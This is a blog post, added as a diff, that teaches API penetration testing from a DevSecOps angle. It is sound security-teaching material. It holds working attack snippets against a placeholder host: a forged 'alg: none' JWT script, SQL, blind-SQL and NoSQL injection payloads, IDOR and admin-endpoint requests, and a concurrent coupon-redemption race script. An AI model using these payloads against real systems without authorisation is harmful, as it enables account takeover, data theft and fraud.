@@ -1,0 +1,312 @@
+---
+title: "How to Hack APIs - Approaches from DevSecOps"
+date: 2026-03-15
+thumbnail: "https://images.unsplash.com/photo-1632893037506-aac33bf18107?w=1200"
+author: hacker1db
+subtitle: "From a defender's perspective: how attackers approach API hacking, and why understanding offense makes you a dramatically better defender."
+tags:
+  - "api-security"
+  - "pentesting"
+  - "devsecops"
+  - "burp-suite"
+  - "reconnaissance"
+  - "offensive-security"
+series: []
+youtube: ""
+toc: true
+draft: false
+---
+
+# How to Hack APIs - Approaches from DevSecOps
+
+There's a saying in security that I keep coming back to: you can't defend what you don't understand how to attack. I believe that fully. Not in a "let's all become red teamers" way, but in the sense that the best defensive decisions I've made came from sitting down, picking up the attacker's tools, and trying to break something I built.
+
+This post is about API hacking from a DevSecOps mindset. I'm not a professional penetration tester — I'm an engineer who builds, deploys, and secures APIs, and who spends enough time on the offensive side to stay honest. Everything here is framed toward making you a better builder and defender, not a better attacker.
+
+All testing should be done against systems you own or have explicit written permission to test. This is not optional.
+
+---
+
+## Phase 1: Reconnaissance — Know Before You Probe
+
+Attackers don't start by throwing exploits. They start by understanding the target. Methodical reconnaissance is what separates a skilled attacker from someone who just runs a scanner and calls it a day.
+
+### Passive Recon
+
+Before touching the API directly, an attacker looks for everything that's publicly available.
+
+**Exposed API documentation:** Many APIs expose Swagger UI or Redoc in production. These are goldmines.
+
+```bash
+# Common paths to check for exposed API docs
+curl https://api.target.com/swagger.json
+curl https://api.target.com/openapi.json
+curl https://api.target.com/v1/docs
+curl https://api.target.com/api-docs
+curl https://api.target.com/.well-known/openapi
+```
+
+An exposed OpenAPI spec tells you every endpoint, every parameter name, every data model. It's the API's own documentation of its attack surface.
+
+**JavaScript source mining:** Frontend applications make API calls. The JavaScript that runs in the browser has to know the endpoints.
+
+```bash
+# Download the main JS bundle and look for API calls
+curl https://app.target.com | grep -oP 'src="[^"]+\.js"'
+# Then grep the JS for API patterns
+curl https://app.target.com/static/main.abc123.js | grep -oP '/api/v[0-9]+/[a-zA-Z/]+'
+```
+
+Tools like [LinkFinder](https://github.com/GerbenJavado/LinkFinder) automate this.
+
+**Search engines and GitHub:** API keys, endpoints, and even credentials get committed to public repos and indexed by search engines.
+
+```
+site:github.com "api.target.com" "Authorization"
+site:github.com "target.com" "api_key"
+```
+
+As a defender, this tells you to: never expose Swagger in production, never hardcode API endpoints in client-side code if they're internal, and scan your own repos for secrets.
+
+### Active Recon
+
+Once you're ready to interact with the target directly, the goal is to build a complete map of the API.
+
+**Endpoint discovery with Kiterunner:**
+
+```bash
+# Kiterunner uses API-aware wordlists and understands methods/content-types
+kr scan https://api.target.com -w routes-large.kite -x 20
+```
+
+Standard directory brute-forcing tools are terrible at APIs. Kiterunner is purpose-built and uses wordlists derived from real API frameworks.
+
+**Capturing traffic through the application:** Run the legitimate frontend application through Burp Suite and use every feature. Every button click, every form submission, every page load generates API traffic. By the end, you have a nearly complete endpoint inventory just from using the app normally.
+
+```
+# In Burp Suite:
+# Proxy > HTTP history > filter by host
+# Export to a sitemap for reference
+```
+
+As a defender: this phase reveals what an attacker can learn about your API from your own frontend. If you're embarrassed by what they could discover, fix the discoverability before you fix the vulnerabilities.
+
+---
+
+## Phase 2: Authentication Testing
+
+Once you have an endpoint map, authentication is the first major attack surface. The goal is to find ways to bypass or abuse the auth system.
+
+### Token Analysis
+
+JWTs are everywhere. Most are implemented correctly. Some are not.
+
+```bash
+# Decode a JWT (without verifying signature) to see the claims
+TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIifQ.abc123"
+
+# Base64-decode the payload (middle section)
+echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null
+# {"sub":"1234567890","role":"user"}
+```
+
+Things to look for in JWT payloads:
+- Is `alg` set to `none` or something weak like `HS256` when it should be `RS256`?
+- Does the payload contain a `role` or `is_admin` field that might be alterable?
+- Is the token expiry (`exp`) far in the future — or absent?
+- Does the `kid` (key ID) header reference a path you could manipulate?
+
+**Testing `alg: none`:**
+
+```python
+import base64, json
+
+header = base64.urlsafe_b64encode(
+    json.dumps({"alg": "none", "typ": "JWT"}).encode()
+).rstrip(b'=').decode()
+
+payload = base64.urlsafe_b64encode(
+    json.dumps({"sub": "1", "role": "admin"}).encode()
+).rstrip(b'=').decode()
+
+forged_token = f"{header}.{payload}."
+print(forged_token)
+```
+
+Send this token to the API. If it accepts it, the server isn't validating the algorithm.
+
+### Auth Bypass on Specific Endpoints
+
+Some APIs apply authentication middleware globally but have endpoints that opt out — health checks, documentation, or legacy routes.
+
+```bash
+# Try unauthenticated access to every discovered endpoint
+for endpoint in $(cat endpoints.txt); do
+  status=$(curl -s -o /dev/null -w "%{http_code}" https://api.target.com$endpoint)
+  if [ "$status" != "401" ] && [ "$status" != "403" ]; then
+    echo "$endpoint -> $status"
+  fi
+done
+```
+
+As a defender: route your authentication middleware through an allowlist-of-public-paths model rather than a blocklist-of-protected-paths model. Forgetting to add a new endpoint to the blocklist is a common mistake.
+
+---
+
+## Phase 3: Authorization Testing
+
+You're authenticated. Now you test whether the API properly restricts what you can do and what data you can access.
+
+### BOLA / IDOR Testing
+
+Create two accounts. Authenticate as user A. Get an object ID from user A's session. Authenticate as user B. Try to access that object ID.
+
+```bash
+# As User A
+RESOURCE_ID=$(curl -s -H "Authorization: Bearer $TOKEN_A" \
+  https://api.target.com/v1/documents \
+  | jq -r '.documents[0].id')
+
+# As User B, try to access User A's document
+curl -H "Authorization: Bearer $TOKEN_B" \
+  https://api.target.com/v1/documents/$RESOURCE_ID
+```
+
+If user B gets the document, you have a BOLA vulnerability. Test this for every endpoint that takes an object identifier.
+
+### Privilege Escalation
+
+Try to access admin endpoints with a regular user token. Try to perform operations that should require elevated privileges.
+
+```bash
+# Try admin endpoints with a regular user token
+curl -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
+  https://api.target.com/v1/admin/users
+
+curl -X DELETE -H "Authorization: Bearer $REGULAR_USER_TOKEN" \
+  https://api.target.com/v1/users/other-user-id
+```
+
+---
+
+## Phase 4: Injection Testing
+
+API parameters are injection vectors. SQL injection through JSON bodies is just as real as through URL parameters.
+
+### SQL Injection in JSON Bodies
+
+```bash
+# Classic SQL injection payloads in JSON
+curl -X POST https://api.target.com/v1/search \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{"query": "test'\'' OR 1=1--"}'
+
+# Time-based blind SQLi
+curl -X POST https://api.target.com/v1/users/lookup \
+  -H "Content-Type: application/json" \
+  -d '{"email": "test@test.com'\'' AND SLEEP(5)--"}'
+```
+
+If the second request takes noticeably longer than 5 seconds to respond, you have a time-based blind SQL injection vulnerability.
+
+### NoSQL Injection
+
+MongoDB and other NoSQL databases have their own injection patterns:
+
+```bash
+# NoSQL operator injection
+curl -X POST https://api.target.com/v1/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+
+# This exploits MongoDB comparison operators to bypass authentication
+```
+
+### GraphQL Injection and Abuse
+
+GraphQL introspection is a recon gift:
+
+```bash
+# Introspection query - reveals the entire schema
+curl -X POST https://api.target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { types { name fields { name } } } }"}'
+```
+
+Disable introspection in production. If you can't, at least require authentication for it.
+
+---
+
+## Phase 5: Business Logic Abuse
+
+This is the hardest category to test systematically and the most impactful when you find something. Business logic vulnerabilities aren't about technical exploitation — they're about abusing the intended functionality in unintended ways.
+
+### Race Conditions
+
+Operations that should be atomic sometimes aren't. Sending concurrent requests can exploit the gap.
+
+```python
+import asyncio
+import aiohttp
+
+async def redeem_coupon(session, token, code):
+    async with session.post(
+        'https://api.target.com/v1/redeem',
+        json={'code': code},
+        headers={'Authorization': f'Bearer {token}'}
+    ) as resp:
+        return await resp.json()
+
+async def race_condition_test():
+    async with aiohttp.ClientSession() as session:
+        # Send 20 concurrent redemption requests
+        tasks = [redeem_coupon(session, TOKEN, 'PROMO-ABC') for _ in range(20)]
+        results = await asyncio.gather(*tasks)
+        successes = [r for r in results if r.get('status') == 'success']
+        print(f"Successful redemptions: {len(successes)}")
+
+asyncio.run(race_condition_test())
+```
+
+### Parameter Pollution and Manipulation
+
+APIs often have parameters that affect pricing, permissions, or quantities. Try manipulating them.
+
+```bash
+# Try negative quantities
+curl -X POST https://api.target.com/v1/cart/items \
+  -d '{"product_id": "123", "quantity": -1}'
+
+# Try zero or fractional prices
+curl -X POST https://api.target.com/v1/checkout \
+  -d '{"total": 0.001}'
+```
+
+---
+
+## How Offense Makes You a Better Defender
+
+After spending time with these techniques, a few things changed in how I build and review APIs:
+
+**I design APIs assuming the client is adversarial.** Every input is potentially malicious. Every path parameter might be someone else's ID. Every field in a request body is a potential mass assignment vector.
+
+**I think about the recon phase when designing APIs.** Does this endpoint reveal more about my internal data model than it needs to? Is there a way to enumerate users from this endpoint's behavior? Am I giving attackers a map of my attack surface through my documentation?
+
+**I treat authorization as infrastructure, not afterthought.** After seeing how quickly BOLA can be exploited, I'm much more rigorous about where authorization checks live in the code. Middleware is not enough — you need checks at the data layer.
+
+**I build better logging because I know what attackers look for.** Knowing that attackers probe for patterns (sequential IDs, predictable tokens) tells me what anomalous behavior in my logs actually means.
+
+**Tool recommendations for defensive teams:**
+- **Burp Suite** — for manual API testing and traffic inspection.
+- **Postman** — for building and organizing API test collections.
+- **OWASP ZAP** — free, solid for automated scanning.
+- **Kiterunner** — endpoint discovery with API-aware wordlists.
+- **jwt_tool** — for JWT analysis and manipulation testing.
+- **ffuf** — for fuzzing parameters and endpoints.
+
+The offensive mindset isn't about being paranoid — it's about being realistic. Attackers are going to probe your APIs. Knowing how they'll do it lets you build something that's genuinely hard to break.
+
+**Your action item:** Set up a local instance of [crAPI](https://github.com/OWASP/crAPI) — the OWASP deliberately vulnerable API lab — and spend two hours trying to break it using the techniques above. You'll learn more in those two hours than in a week of reading.
+
+Go break something. Then go fix your own stuff.
